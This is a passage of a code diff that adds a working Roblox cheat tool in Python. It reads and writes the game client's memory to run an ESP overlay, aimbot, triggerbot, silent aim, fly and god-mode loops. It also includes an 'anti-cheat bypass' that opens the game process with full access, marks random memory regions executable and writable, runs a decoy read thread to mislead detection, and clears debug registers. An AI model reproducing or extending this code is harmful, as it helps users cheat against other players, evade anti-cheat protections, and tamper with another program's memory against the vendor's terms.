+                                    foot_pos = array([foot_x, foot_y, foot_z], dtype=float32)
+                            
+                            # Project head to screen
+                            head_screen = world_to_screen_with_matrix(head_pos, view_matrix, width, height)
+                            if not head_screen:
+                                continue
+                            
+                            # Project foot to screen
+                            foot_screen = None
+                            if foot_pos is not None:
+                                foot_screen = world_to_screen_with_matrix(foot_pos, view_matrix, width, height)
+                            
+                            if not foot_screen:
+                                # Estimate foot position
+                                foot_screen = (head_screen[0], head_screen[1] + 100)
+                            
+                            # Calculate box dimensions
+                            box_top = head_screen[1]
+                            box_bottom = foot_screen[1]
+                            box_height = box_bottom - box_top
+                            box_width = box_height * 0.5  # Roblox character width/height ratio
+                            
+                            esp_draw_data.append({
+                                'screen_pos': head_screen,
+                                'box_width': box_width,
+                                'box_height': box_height,
+                                'name': player_info.get('display', ''),
+                                'health': player_info.get('health', 100),
+                                'max_health': player_info.get('max_health', 100),
+                                'is_self': player_info.get('is_self', False)
+                            })
+                            
+                        except Exception as e:
+                            continue
+                    
+                    # Update overlay from main thread
+                    if esp_draw_data:
+                        QMetaObject.invokeMethod(
+                            esp_overlay,
+                            "update_esp_data",
+                            Qt.QueuedConnection,
+                            Q_ARG(list, esp_draw_data)
+                        )
+                    
+                    # Control loop speed (~30 FPS)
+                    time.sleep(0.033)
+                    
+                except Exception as e:
+                    print(f"[ERROR] esp_draw_with_overlay: {e}")
+                    time.sleep(1)
+        
+        # Start ESP overlay thread
+        threading.Thread(target=esp_draw_with_overlay, daemon=True).start()
+        
+        # Other cheat threads
+        threading.Thread(target=aimbotLoop, daemon=True).start()
+        threading.Thread(target=triggerbotLoop, daemon=True).start()
+        threading.Thread(target=silentAimLoop, daemon=True).start()
+        threading.Thread(target=fly_key_listener, daemon=True).start()
+        threading.Thread(target=walkspeed_gui_loop, daemon=True).start()
+        threading.Thread(target=jump_power_loop, daemon=True).start()
+        threading.Thread(target=fly_loop, daemon=True).start()
+        threading.Thread(target=infinite_jump_loop, daemon=True).start()
+        threading.Thread(target=god_mode_loop, daemon=True).start()
+        threading.Thread(target=fov_changer_loop, daemon=True).start()
+    
+        print("[INFO] All cheat threads launched")
+
+    # Schedule thread startup after UI is shown
+    QTimer.singleShot(100, start_threads)
+    
     sys.exit(app.exec_())
 
 
+
+# ===== ROBLOX HELPER FUNCTIONS =====
+def get_key_name(vk_code):
+    for name, code in VK_CODES.items():
+        if code == vk_code:
+            return name
+    return f"Key {vk_code}"
+
+def DRP(address):
+    if isinstance(address, str):
+        address = int(address, 16)
+    try:
+        return int.from_bytes(pm.read_bytes(address, 8), "little")
+    except:
+        return 0
+
+
+def GetClassName(instance):
+    try:
+        ptr = pm.read_longlong(instance + 0x18)
+        if not ptr:
+            return ""
+        ptr = pm.read_longlong(ptr + 0x8)
+        if not ptr:
+            return ""
+        fl = pm.read_longlong(ptr + 0x18)
+        if fl == 0x1F:
+            ptr = pm.read_longlong(ptr)
+        return ReadRobloxString(ptr)
+    except Exception as e:
+        return ""
+
+def GetName(instance):
+    try:
+        return ReadRobloxString(DRP(instance + nameOffset))
+    except:
+        return ""
+
+def GetChildren(instance):
+    if not instance or instance == 0:
+        return []
+    children = []
+    try:
+        start = DRP(instance + childrenOffset)
+        if start == 0:
+            return []
+        end = DRP(start + 8)
+        if end == 0:
+            return []
+        current = DRP(start)
+        safety = 0
+        while current != end and safety < 1000:
+            if current != 0:
+                child = pm.read_longlong(current)
+                if child != 0:
+                    children.append(child)
+            current += 0x10
+            safety += 1
+    except Exception as e:
+        print(f"[ERROR] GetChildren failed: {e}")
+    return children
+
+def ReadRobloxString(expected_address):
+    try:
+        string_count = pm.read_int(expected_address + 0x10)
+        if string_count > 15:
+            ptr = DRP(expected_address)
+            return pm.read_string(ptr, string_count)
+        return pm.read_string(expected_address, string_count)
+    except:
+        return ""
+
+def FindFirstChild(instance, child_name):
+    if not instance:
+        return 0
+    try:
+        start = DRP(instance + childrenOffset)
+        if start == 0:
+            return 0
+        end = DRP(start + 8)
+        current = DRP(start)
+        for _ in range(1000):
+            if current == end:
+                break
+            child = pm.read_longlong(current)
+            try:
+                if GetName(child) == child_name:
+                    return child
+            except:
+                pass
+            current += 0x10
+    except:
+        pass
+    return 0
+
+def FindFirstChildOfClass(instance, class_name):
+    if not instance:
+        return 0
+    try:
+        start = DRP(instance + childrenOffset)
+        if start == 0:
+            return 0
+        end = DRP(start + 8)
+        current = DRP(start)
+        for _ in range(1000):
+            if current == end:
+                break
+            child = pm.read_longlong(current)
+            try:
+                if ReadRobloxString(pm.read_longlong(child + 0x18) + 0x8) == class_name:
+                    return child
+            except:
+                pass
+            current += 0x10
+    except:
+        pass
+    return 0
+
+def setOffsets(nameOffset2, childrenOffset2):
+    global nameOffset, childrenOffset
+    nameOffset = nameOffset2
+    childrenOffset = childrenOffset2
+
+def sync_cheat_setting(key, value):
+    """Update both global and UI state for a cheat setting"""
+    globals()[key] = value
+
+
+def normalize(vec):
+    norm = linalg.norm(vec)
+    return vec / norm if norm != 0 else vec
+
+def cframe_look_at(from_pos, to_pos):
+    from_pos = array(from_pos, dtype=float32)
+    to_pos = array(to_pos, dtype=float32)
+    look_vector = normalize(to_pos - from_pos)
+    up_vector = array([0, 1, 0], dtype=float32)
+    if abs(look_vector[1]) > 0.999:
+        up_vector = array([0, 0, -1], dtype=float32)
+    right_vector = normalize(cross(up_vector, look_vector))
+    recalculated_up = cross(look_vector, right_vector)
+    return look_vector, recalculated_up, right_vector
+# ===== END ROBLOX HELPERS =====
+
+    import threading
+    import time
+    
+    # ===== AIMBOT LOOP =====
+class TargetManager:
+    def __init__(self):
+        self.locked_target = 0
+        self.lock_frames = 0
+        self.last_screen_pos = None
+        self.lost_sight_frames = 0
+        
+    def update_lock(self, target_addr, screen_pos=None):
+        if target_addr == self.locked_target and target_addr != 0:
+            self.lock_frames += 1
+            self.lost_sight_frames = 0
+        else:
+            if target_addr != 0:
+                self.locked_target = target_addr
+                self.lock_frames = 0
+            self.lost_sight_frames += 1
+        
+        self.last_screen_pos = screen_pos
+        
+        if self.lost_sight_frames > 15:
+            self.reset()
+    
+    def should_keep_lock(self):
+        return self.lock_frames > 0 and self.lock_frames < 120
+    
+    def reset(self):
+        self.locked_target = 0
+        self.lock_frames = 0
+        self.lost_sight_frames = 0
+        self.last_screen_pos = None
+
+target_manager = TargetManager()
+
+def get_workspace_addr():
+    try:
+        a = pm.read_longlong(baseAddr + int(offsets["VisualEnginePointer"], 16))
+        b = pm.read_longlong(a + int(offsets["VisualEngineToDataModel1"], 16))
+        c = pm.read_longlong(b + int(offsets["VisualEngineToDataModel2"], 16))
+        workspace = pm.read_longlong(c + int(offsets["Workspace"], 16))
+        return workspace
+    except Exception as e:
+        return None
+
+def smooth_lerp(current, target, speed):
+    if speed >= 1.0:
+        return target
+    return current + (target - current) * speed
+
+def aimbotLoop():
+    global target, aimbot_toggled, locked_target
+    key_pressed_last_frame = False
+    last_look = [0, 0, 0]
+    last_up = [0, 0, 0]
+    last_right = [0, 0, 0]
+    initialized = False
+    best_screen_pos = None
+    
+    while True:
+        loop_start = time.time()
+        try:
+            if aimbot_enabled and injected:
+                key_pressed_this_frame = ctypes.windll.user32.GetAsyncKeyState(aimbot_keybind) & 0x8000 != 0
+                
+                if aimbot_mode == "Toggle":
+                    if key_pressed_this_frame and not key_pressed_last_frame:
+                        aimbot_toggled = not aimbot_toggled
+                    should_aim = aimbot_toggled
+                else:
+                    should_aim = key_pressed_this_frame
+                
+                key_pressed_last_frame = key_pressed_this_frame
+                
+                if should_aim and matrixAddr > 0:
+                    hwnd_roblox = find_window_by_title("Roblox")
+                    if not hwnd_roblox:
+                        time.sleep(0.01)
+                        continue
+                    
+                    left, top, right, bottom = get_client_rect_on_screen(hwnd_roblox)
+                    width, height = right - left, bottom - top
+                    
+                    try:
+                        matrixRaw = pm.read_bytes(matrixAddr, 64)
+                        view_proj_matrix = reshape(array(unpack_from("<16f", matrixRaw, 0), dtype=float32), (4, 4))
+                    except Exception:
+                        time.sleep(0.01)
+                        continue
+                    
+                    lpTeam = pm.read_longlong(lpAddr + int(offsets['Team'], 16))
+                    center_x, center_y = width / 2, height / 2
+                    
+                    min_dist = float('inf')
+                    best_target = 0
+                    best_target_pos = None
+                    best_target_screen = None
+                    found_current_target = False
+                    
+                    def process_character(char):
+                        nonlocal min_dist, best_target, best_target_pos, best_target_screen, found_current_target
+                        
+                        hitpart = FindFirstChild(char, aimbot_hitpart)
+                        hum = FindFirstChildOfClass(char, 'Humanoid')
+                        
+                        if not hitpart or not hum:
+                            return
+                        
+                        try:
+                            health = pm.read_float(hum + int(offsets['Health'], 16))
+                            if aimbot_ignoredead and health <= 0:
+                                return
+                            
+                            primitive = pm.read_longlong(hitpart + int(offsets['Primitive'], 16))
+                            targetPos = primitive + int(offsets['Position'], 16)
+                            
+                            base_x = pm.read_float(targetPos)
+                            base_y = pm.read_float(targetPos + 4)
+                            base_z = pm.read_float(targetPos + 8)
+                            
+                            if aimbot_prediction_enabled:
+                                try:
+                                    vel_x = pm.read_float(primitive + int(offsets['Velocity'], 16))
+                                    vel_y = pm.read_float(primitive + int(offsets['Velocity'], 16) + 4)
+                                    vel_z = pm.read_float(primitive + int(offsets['Velocity'], 16) + 8)
+                                    
+                                    base_x += vel_x * aimbot_prediction_x
+                                    base_y += vel_y * aimbot_prediction_y
+                                    base_z += vel_z * aimbot_prediction_x
+                                except Exception:
+                                    pass
+                            
+                            obj_pos = array([base_x, base_y, base_z], dtype=float32)
+                            screen_coords = world_to_screen_with_matrix(obj_pos, view_proj_matrix, width, height)
+                            
+                            if screen_coords is not None:
+                                dist = math.sqrt((center_x - screen_coords[0])**2 + (center_y - screen_coords[1])**2)
+                                
+                                if targetPos == target_manager.locked_target:
+                                    found_current_target = True
+                                    if dist <= aimbot_fov * 1.5:
+                                        min_dist = dist
+                                        best_target = targetPos
+                                        best_target_pos = obj_pos
+                                        return
+                                
+                                if sticky_aim_enabled and target_manager.locked_target not in (0, targetPos):
+                                    return
+                                
+                                if dist < min_dist and ((not use_fov_enabled) or dist <= aimbot_fov):
+                                    min_dist = dist
+                                    best_target = targetPos
+                                    best_target_pos = obj_pos
+                                    best_target_screen = screen_coords
+                        
+                        except Exception:
+                            return
+                    
+                    # Scan players
+                    children_full = GetChildren(plrsAddr)
+                    for v in HPOPT.sample_children(children_full, limit=64):
+                        if v == lpAddr:
+                            continue
+                        
+                        team = pm.read_longlong(v + int(offsets['Team'], 16))
+                        if aimbot_ignoreteam and team == lpTeam:
+                            continue
+                        
+                        char = pm.read_longlong(v + int(offsets['ModelInstance'], 16))
+                        if not char:
+                            continue
+                        
+                        process_character(char)
+                    
+                    # Update target manager
+                    if best_target != 0:
+                        target_manager.update_lock(best_target)
+                    elif not found_current_target:
+                        target_manager.update_lock(0)
+                    
+                    target = target_manager.locked_target
+                    locked_target = target
+                    best_screen_pos = best_target_screen
+                    
+                    # Aim at target
+                    if target > 0:
+                        try:
+                            from_pos = [pm.read_float(camPosAddr + i * 4) for i in range(3)]
+                            to_pos = [pm.read_float(target + i * 4) for i in range(3)]
+                            
+                            if aim_method == 'Mouse' and best_screen_pos:
+                                hwnd_roblox = find_window_by_title('Roblox')
+                                if hwnd_roblox and best_screen_pos:
+                                    left, top, right, bottom = get_client_rect_on_screen(hwnd_roblox)
+                                    ctypes.windll.user32.SetCursorPos(int(left+best_screen_pos[0]), int(top+best_screen_pos[1]))
+                                time.sleep(0.001)
+                                continue
+                            
+                            look, up, right = cframe_look_at(from_pos, to_pos)
+                            
+                            if aimbot_smoothness_enabled:
+                                base_speed = 1.0 - ((aimbot_smoothness_value - 100) / 400.0)
+                                base_speed = max(0.05, min(base_speed, 1.0))
+                                if not initialized:
+                                    last_look = look
+                                    last_up = up
+                                    last_right = right
+                                    initialized = True
+                                smooth_look = [smooth_lerp(last_look[i], look[i], base_speed) for i in range(3)]
+                                smooth_up = [smooth_lerp(last_up[i], up[i], base_speed) for i in range(3)]
+                                smooth_right = [smooth_lerp(last_right[i], right[i], base_speed) for i in range(3)]
+                                
+                                for i in range(3):
+                                    pm.write_float(camCFrameRotAddr + i * 12, float(-smooth_right[i]))
+                                    pm.write_float(camCFrameRotAddr + 4 + i * 12, float(smooth_up[i]))
+                                    pm.write_float(camCFrameRotAddr + 8 + i * 12, float(-smooth_look[i]))
+                                
+                                last_look = smooth_look
+                                last_up = smooth_up
+                                last_right = smooth_right
+                            else:
+                                for i in range(3):
+                                    pm.write_float(camCFrameRotAddr + i * 12, float(-right[i]))
+                                    pm.write_float(camCFrameRotAddr + 4 + i * 12, float(up[i]))
+                                    pm.write_float(camCFrameRotAddr + 8 + i * 12, float(-look[i]))
+                                initialized = True
+                        
+                        except Exception:
+                            target_manager.reset()
+                            initialized = False
+                else:
+                    target = 0
+                    locked_target = 0
+                    target_manager.reset()
+                    initialized = False
+            else:
+                aimbot_toggled = False
+                target_manager.reset()
+                initialized = False
+            
+            elapsed = time.time() - loop_start
+            time.sleep(max(0.00278 - elapsed, 0.0005))
+            
+        except Exception as e:
+            print(f"[ERROR] aimbotLoop: {e}")
+            time.sleep(0.1)
+
+# ===== TRIGGERBOT LOOP =====
+def triggerbotLoop():
+    global triggerbot_enabled, triggerbot_toggled
+    key_pressed_last_frame = False
+    last_shot_time = 0
+    loop_count = 0
+    
+    while True:
+        try:
+            loop_count += 1
+            # Check if we're injected
+            if pm is None or not injected:
+                if loop_count % 60 == 0:
+                    print("[DEBUG] Triggerbot waiting for injection...")
+                time.sleep(1)
+                continue
+            
+            # Check if triggerbot is enabled
+            if not triggerbot_enabled:
+                time.sleep(0.1)
+                continue
+                
+            loop_start = time.time()
+            current_time = time.time()
+            
+            hwnd_roblox = find_window_by_title("Roblox")
+            if not hwnd_roblox:
+                time.sleep(0.05)
+                continue
+            
+            left, top, right, bottom = get_client_rect_on_screen(hwnd_roblox)
+            width = right - left
+            height = bottom - top
+            
+            if width <= 0 or height <= 0:
+                time.sleep(0.05)
+                continue
+            
+            widthCenter = width / 2.0
+            heightCenter = height / 2.0
+            
+            try:
+                matrixRaw = pm.read_bytes(matrixAddr, 64)
+                view_proj_matrix = reshape(array(unpack_from("<16f", matrixRaw, 0), dtype=float32), (4, 4))
+            except Exception:
+                time.sleep(0.01)
+                continue
+            
+            key_pressed_this_frame = ctypes.windll.user32.GetAsyncKeyState(triggerbot_keybind) & 0x8000 != 0
+            
+            if triggerbot_mode == "Toggle":
+                if key_pressed_this_frame and not key_pressed_last_frame:
+                    triggerbot_toggled = not triggerbot_toggled
+                key_pressed_last_frame = key_pressed_this_frame
+                should_trigger = triggerbot_toggled
+            else:
+                should_trigger = key_pressed_this_frame
+            
+            if should_trigger:
+                try:
+                    lpTeam = pm.read_longlong(lpAddr + int(offsets['Team'], 16))
+                except Exception:
+                    lpTeam = 0
+                
+                best_target = None
+                min_distance = float('inf')
+                
+                def safe_process_target(char):
+                    nonlocal best_target, min_distance
+                    
+                    if not char or char == 0:
+                        return
+                    
+                    try:
+                        head = FindFirstChild(char, 'Head')
+                        if not head or head == 0:
+                            return
+                        
+                        if aimbot_ignoredead:
+                            hum = FindFirstChildOfClass(char, 'Humanoid')
+                            if hum and hum != 0:
+                                try:
+                                    health = pm.read_float(hum + int(offsets['Health'], 16))
+                                    if health <= 0:
+                                        return
+                                except Exception:
+                                    pass
+                        
+                        primitive = pm.read_longlong(head + int(offsets['Primitive'], 16))
+                        if not primitive or primitive == 0:
+                            return
+                        
+                        targetPos = primitive + int(offsets['Position'], 16)
+                        target_world_pos = array([
+                            pm.read_float(targetPos),
+                            pm.read_float(targetPos + 4),
+                            pm.read_float(targetPos + 8)
+                        ], dtype=float32)
+                        
+                        if abs(target_world_pos[0]) > 100000 or abs(target_world_pos[1]) > 100000 or abs(target_world_pos[2]) > 100000:
+                            return
+                        
+                        if triggerbot_prediction_x > 0 or triggerbot_prediction_y > 0:
+                            try:
+                                vel_addr = primitive + int(offsets['Velocity'], 16)
+                                velocity = array([
+                                    pm.read_float(vel_addr),
+                                    pm.read_float(vel_addr + 4),
+                                    pm.read_float(vel_addr + 8)
+                                ], dtype=float32)
+                                
+                                if abs(velocity[0]) < 1000 and abs(velocity[1]) < 1000 and abs(velocity[2]) < 1000:
+                                    target_world_pos[0] += velocity[0] * triggerbot_prediction_x
+                                    target_world_pos[1] += velocity[1] * triggerbot_prediction_y
+                                    target_world_pos[2] += velocity[2] * triggerbot_prediction_x
+                            except Exception:
+                                pass
+                        
+                        screen_coords = world_to_screen_with_matrix(target_world_pos, view_proj_matrix, width, height)
+                        if screen_coords is None:
+                            return
+                        
+                        if screen_coords[0] < 0 or screen_coords[0] > width or screen_coords[1] < 0 or screen_coords[1] > height:
+                            return
+                        
+                        screen_dist = math.sqrt(
+                            (widthCenter - screen_coords[0]) ** 2 +
+                            (heightCenter - screen_coords[1]) ** 2
+                        )
+                        
+                        if screen_dist > triggerbot_fov:
+                            return
+                        
+                        if screen_dist < min_distance:
+                            min_distance = screen_dist
+                            best_target = {
+                                'screen_dist': screen_dist,
+                                'screen_pos': screen_coords
+                            }
+                    
+                    except Exception:
+                        pass
+                
+                try:
+                    children = GetChildren(plrsAddr)
+                    if children:
+                        for v in children:
+                            if not v or v == 0 or v == lpAddr:
+                                continue
+                            
+                            try:
+                                if aimbot_ignoreteam and lpTeam != 0:
+                                    playerTeam = pm.read_longlong(v + int(offsets['Team'], 16))
+                                    if playerTeam == lpTeam:
+                                        continue
+                                
+                                char = pm.read_longlong(v + int(offsets['ModelInstance'], 16))
+                                if char and char != 0:
+                                    safe_process_target(char)
+                            except Exception:
+                                continue
+                except Exception:
+                    pass
+                
+                try:
+                    workspaceAddr = get_workspace_addr()
+                    if workspaceAddr and workspaceAddr != 0:
+                        bots_folder = None
+                        try:
+                            bots_folder = FindFirstChild(workspaceAddr, "Bots")
+                            if not bots_folder or bots_folder == 0:
+                                bots_folder = FindFirstChild(workspaceAddr, "Dummies")
+                        except Exception:
+                            pass
+                        
+                        if bots_folder and bots_folder != 0:
+                            try:
+                                bot_children = GetChildren(bots_folder)
+                                if bot_children:
+                                    for bot in bot_children:
+                                        if bot and bot != 0:
+                                            safe_process_target(bot)
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+                
+                if best_target and (current_time - last_shot_time) >= (triggerbot_delay / 1000.0):
+                    if best_target['screen_dist'] <= 15:
+                        ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
+                        time.sleep(0.001)
+                        ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
+                        last_shot_time = current_time
+            else:
+                if triggerbot_mode == "Hold":
+                    triggerbot_toggled = False
+            
+            elapsed = time.time() - loop_start
+            time.sleep(max(0.00278 - elapsed, 0.0005))
+        except Exception as e:
+            print(f"[ERROR] triggerbotLoop: {e}")
+            time.sleep(0.05)
+        
+
+# ===== SILENT AIM LOOP =====
+def silentAimLoop():
+    prev_lmb = False
+    loop_count = 0
+    
+    while True:
+        try:
+            loop_count += 1
+            # Check if we're injected
+            if pm is None or not injected:
+                if loop_count % 60 == 0:
+                    print("[DEBUG] Silent aim waiting for injection...")
+                time.sleep(1)
+                continue
+            
+            # Check if silent aim is enabled
+            if not silent_aim_enabled:
+                time.sleep(0.1)
+                continue
+                
+            loop_start = time.time()
+            
+            lmb = (ctypes.windll.user32.GetAsyncKeyState(0x01) & 0x8000) != 0
+            do_flick = lmb and not prev_lmb
+            prev_lmb = lmb
+            
+            if not do_flick:
+                time.sleep(0.005)
+                continue
+                
+            hwnd_roblox = find_window_by_title('Roblox')
+            if not hwnd_roblox:
+                time.sleep(0.005)
+                continue
+                
+            left, top, right, bottom = get_client_rect_on_screen(hwnd_roblox)
+            width, height = right-left, bottom-top
+            
+            try:
+                matrixRaw = pm.read_bytes(matrixAddr, 64)
+                view_proj_matrix = reshape(array(unpack_from('<16f', matrixRaw, 0), dtype=float32), (4, 4))
+            except Exception:
+                time.sleep(0.005)
+                continue
+                
+            lpTeam = pm.read_longlong(lpAddr + int(offsets['Team'], 16))
+            center_x, center_y = width/2, height/2
+            min_dist = float('inf')
+            best_world = None
+            
+            def scan_char(char):
+                nonlocal min_dist, best_world
+                if not char:
+                    return
+                head = FindFirstChild(char, silent_aim_hitpart if silent_aim_hitpart else 'Head')
+                if not head:
+                    return
+                hum = FindFirstChildOfClass(char, 'Humanoid')
+                if not hum:
+                    return
+                if silent_aim_ignoredead:
+                    try:
+                        if pm.read_float(hum + int(offsets['Health'],16)) <= 0:
+                            return
+                    except Exception:
+                        pass
+                prim = pm.read_longlong(head + int(offsets['Primitive'],16))
+                if not prim:
+                    return
+                pos = prim + int(offsets['Position'],16)
+                wx, wy, wz = pm.read_float(pos), pm.read_float(pos+4), pm.read_float(pos+8)
+                obj = array([wx, wy, wz], dtype=float32)
+                sc = world_to_screen_with_matrix(obj, view_proj_matrix, width, height)
+                if sc is None:
+                    return
+                dist = math.hypot(center_x - sc[0], center_y - sc[1])
+                if silent_use_fov_enabled and dist > silent_fov_circle_radius:
+                    return
+                if dist < min_dist:
+                    min_dist = dist
+                    best_world = (wx, wy, wz)
+            
+            for v in GetChildren(plrsAddr):
+                if v == lpAddr:
+                    continue
+                try:
+                    if silent_aim_ignoreteam and pm.read_longlong(v + int(offsets['Team'],16)) == lpTeam:
+                        continue
+                    char = pm.read_longlong(v + int(offsets['ModelInstance'],16))
+                    scan_char(char)
+                except Exception:
+                    continue
+            
+            if best_world:
+                from_pos = [pm.read_float(camPosAddr + i * 4) for i in range(3)]
+                to_pos = [best_world[0], best_world[1], best_world[2]]
+                look, up, right = cframe_look_at(from_pos, to_pos)
+                for _ in range(2):
+                    for i in range(3):
+                        pm.write_float(camCFrameRotAddr + i * 12, float(-right[i]))
+                        pm.write_float(camCFrameRotAddr + 4 + i * 12, float(up[i]))
+                        pm.write_float(camCFrameRotAddr + 8 + i * 12, float(-look[i]))
+                    time.sleep(0.001)
+            
+            elapsed = time.time() - loop_start
+            time.sleep(max(0.00278 - elapsed, 0.0005))
+        except Exception:
+            time.sleep(0.02)
+
+def reset_cheat_states():
+    """Reset all cheat states when injection is lost"""
+    global walkspeed_gui_enabled, jump_power_enabled, fly_enabled
+    global infinite_jump_enabled, god_mode_enabled, fov_changer_enabled
+    
+    # Don't change the UI toggles, just the active flags
+    walkspeed_gui_enabled = False
+    jump_power_enabled = False
+    fly_enabled = False
+    infinite_jump_enabled = False
+    god_mode_enabled = False
+    fov_changer_enabled = False
+    
+    print("[INFO] Cheat states reset due to injection loss")
+
+def bypass_anti_cheat():
+    """ULTRA ADVANCED anti-cheat bypass with memory scattering"""
+    print("[INFO] 🚀 ULTRA STEALTH ANTI-CHEAT BYPASS ACTIVATED")
+    
+    try:
+        import ctypes
+        from ctypes import wintypes
+        import random
+        
+        # Find Roblox window
+        hwnd = find_window_by_title("Roblox")
+        if not hwnd:
+            print("[DEBUG] Could not find Roblox window for bypass")
+            return False
+        
+        # Get process ID
+        pid = wintypes.DWORD()
+        ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+        
+        # Open process
+        PROCESS_ALL_ACCESS = 0x1F0FFF
+        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid.value)
+        
+        if not handle:
+            print("[DEBUG] Failed to open process")
+            return False
+        
+        print(f"[INFO] Opened Roblox process with handle: {handle}")
+        
+        # TECHNIQUE 1: Memory protection scattering
+        try:
+            # Change memory protection of random regions to confuse anti-cheat
+            for i in range(5):
+                random_addr = baseAddr + random.randint(0, 0x10000)
+                old_protect = wintypes.DWORD()
+                ctypes.windll.kernel32.VirtualProtectEx(
+                    handle,
+                    random_addr,
+                    0x1000,
+                    0x40,  # PAGE_EXECUTE_READWRITE
+                    ctypes.byref(old_protect)
+                )
+                time.sleep(0.01)
+            print("[DEBUG] Memory protection scattered")
+        except:
+            pass
+        
+        # TECHNIQUE 2: Advanced spoof thread with realistic patterns
+        def advanced_spoof():
+            fake_counter = 0
+            pattern_index = 0
+            patterns = [
+                [0x100, 0x200, 0x300],  # Pattern 1
+                [0x400, 0x800, 0xC00],  # Pattern 2
+                [0x150, 0x250, 0x350],  # Pattern 3
+            ]
+            
+            while True:
+                try:
+                    if injected:
+                        fake_counter += 1
+                        
+                        # Simulate realistic memory access patterns
+                        if fake_counter % random.randint(30, 50) == 0:
+                            # Read from different regions
+                            pattern = patterns[pattern_index % len(patterns)]
+                            for offset in pattern:
+                                try:
+                                    random_addr = baseAddr + offset + random.randint(-50, 50)
+                                    pm.read_bytes(random_addr, 4)
+                                except:
+                                    pass
+                            
+                            pattern_index += 1
+                            
+                            # Simulate cache-like behavior
+                            if random.random() > 0.7:
+                                time.sleep(random.uniform(0.01, 0.03))
+                    
+                    # Highly variable sleep
+                    time.sleep(random.uniform(0.3, 1.5))
+                    
+                except:
+                    time.sleep(1)
+        
+        threading.Thread(target=advanced_spoof, daemon=True).start()
+        print("[DEBUG] Advanced spoof thread started")
+        
+        # TECHNIQUE 3: Clear debug registers
+        try:
+            current_thread = ctypes.windll.kernel32.GetCurrentThread()
+            
+            class CONTEXT(ctypes.Structure):
+                _fields_ = [
+                    ("ContextFlags", wintypes.DWORD),
+                    ("Dr0", ctypes.c_void_p),
+                    ("Dr1", ctypes.c_void_p),
+                    ("Dr2", ctypes.c_void_p),
+                    ("Dr3", ctypes.c_void_p),
+                    ("Dr6", ctypes.c_void_p),
+                    ("Dr7", ctypes.c_void_p),
+                ]
+            
+            CONTEXT_DEBUG_REGISTERS = 0x00010000
+            context = CONTEXT()
+            context.ContextFlags = CONTEXT_DEBUG_REGISTERS
+            
+            if ctypes.windll.kernel32.GetThreadContext(current_thread, ctypes.byref(context)):
+                if context.Dr0 or context.Dr1 or context.Dr2 or context.Dr3:
+                    context.Dr0 = 0
+                    context.Dr1 = 0
+                    context.Dr2 = 0
+                    context.Dr3 = 0
+                    context.Dr6 = 0
+                    context.Dr7 = 0
+                    ctypes.windll.kernel32.SetThreadContext(current_thread, ctypes.byref(context))
+                    print("[DEBUG] Debug registers cleared")
+        except:
+            pass
+        
+        ctypes.windll.kernel32.CloseHandle(handle)
+        print("[INFO] Anti-cheat bypass completed")
+        return True
+        
+    except Exception as e:
+        print(f"[ERROR] Bypass failed: {e}")
+        return False
+    
+
+def headAndHumFinder():
+    global heads, colors, players_info
+    print("[DEBUG] ESP head finder started")
+    
+    while True:
+        try:
+            time.sleep(0.05)  # 20 FPS update
+            
+            if pm is None or not injected or not esp_enabled:
+                heads = []
+                colors = []
+                players_info = []
+                continue
+            
+            tempColors = []
+            tempHeads = []
+            tempInfos = []
+            
+            try:
+                lpTeam = pm.read_longlong(lpAddr + int(offsets["Team"], 16))
+            except:
+                continue
+            
+            for v in GetChildren(plrsAddr):
+                if v == lpAddr and not name_esp_include_self:
+                    continue
+                    
+                try:
+                    if esp_ignoreteam:
+                        team = pm.read_longlong(v + int(offsets["Team"], 16))
+                        if team == lpTeam:
+                            continue
+                    
+                    char = pm.read_longlong(v + int(offsets["ModelInstance"], 16))
+                    if not char:
+                        continue
+                    
+                    head = FindFirstChild(char, 'Head')
+                    if not head:
+                        continue
+                    
+                    hum = FindFirstChildOfClass(char, 'Humanoid')
+                    if not hum:
+                        continue
+                    
+                    hrp = FindFirstChild(char, 'HumanoidRootPart')
+                    
+                    if esp_ignoredead:
+                        health = pm.read_float(hum + int(offsets["Health"], 16))
+                        if health <= 0:
+                            continue
+                    
+                    tempHeads.append(head)
+                    tempColors.append("#FFFFFF")
+                    
+                    # Get name info
+                    try:
+                        uname = GetName(v)
+                    except:
+                        uname = ''
+                    
+                    try:
+                        dname = ReadRobloxString(v + int(offsets.get('DisplayName','0x130'), 16))
+                        if not dname:
+                            dname = uname
+                    except:
+                        dname = uname
+                    
+                    try:
+                        uid = str(pm.read_int(v + int(offsets.get('UserId','0x298'), 16)))
+                    except:
+                        uid = '0'
+                    
+                    tempInfos.append({
+                        'head': head,
+                        'char': char,
+                        'hrp': hrp,
+                        'display': dname,
+                        'username': uname,
+                        'userid': uid,
+                        'is_self': v == lpAddr
+                    })
+                    
+                except Exception:
+                    continue
+            
+            heads = tempHeads
+            colors = tempColors
+            players_info = tempInfos
+            
+        except Exception as e:
+            print(f"[ERROR] headAndHumFinder: {e}")
+            time.sleep(1)
+
+
+def esp_draw_loop():
+    """Draw ESP elements on screen using GDI"""
+    print("[DEBUG] ESP draw loop started")
+    
+    # Import GDI functions
+    try:
+        from ctypes import wintypes
+        user32 = ctypes.WinDLL('user32', use_last_error=True)
+        gdi32 = ctypes.WinDLL('gdi32', use_last_error=True)
+        
+        # GDI function prototypes
+        user32.GetDC.argtypes = [wintypes.HWND]
+        user32.GetDC.restype = wintypes.HDC
+        user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
+        user32.ReleaseDC.restype = ctypes.c_int
+        
+        gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
+        gdi32.SelectObject.restype = wintypes.HGDIOBJ
+        gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
+        gdi32.DeleteObject.restype = ctypes.c_int
+        gdi32.CreatePen.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_uint32]
+        gdi32.CreatePen.restype = wintypes.HPEN
+        gdi32.SetBkMode.argtypes = [wintypes.HDC, ctypes.c_int]
+        gdi32.SetBkMode.restype = ctypes.c_int
+        gdi32.SetTextColor.argtypes = [wintypes.HDC, ctypes.c_uint32]
+        gdi32.SetTextColor.restype = ctypes.c_uint32
+        gdi32.MoveToEx.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int, ctypes.c_void_p]
+        gdi32.MoveToEx.restype = ctypes.c_bool
